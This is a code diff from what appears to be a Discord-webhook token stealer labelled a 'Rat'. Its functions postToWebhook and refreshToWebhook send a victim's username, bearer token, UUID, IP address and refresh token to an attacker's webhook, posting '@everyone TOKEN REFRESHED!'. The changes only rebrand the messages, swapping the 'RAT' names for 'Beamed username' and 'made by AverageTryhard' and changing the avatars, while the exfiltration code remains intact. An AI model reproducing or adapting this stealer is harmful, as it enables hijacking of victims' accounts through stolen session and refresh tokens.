@@ -129,7 +129,7 @@ async function getUsernameAndUUID(bearerToken) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-username: "[LVL 100] Rat",
+username: "Beamed username",
   avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
 content: "@everyone",
   embeds: [
@@ -157,8 +157,8 @@ content: "@everyone",
         }
       ],
       "footer": {
-        "text": "RAT",
-        "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
+        "text": "made by AverageTryhard",
+        "icon_url": "https://cdn.discordapp.com/avatars/811395933824483328/db8bbb5fe511bef14c7ff9bbdd157abe.png?size=1024"
       }
     }
   ],
@@ -279,8 +279,8 @@ async function getNewUsernameAndUUID(newBearerToken) {
 function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
     const url = webhook_url
     let data = {
-username: "[LVL 100] Rat",
-  avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
+username: "Refreshed username",
+  avatar_url: "https://cdn.discordapp.com/avatars/811395933824483328/db8bbb5fe511bef14c7ff9bbdd157abe.png?size=1024",  
 content: "@everyone TOKEN REFRESHED!",
   embeds: [
     {
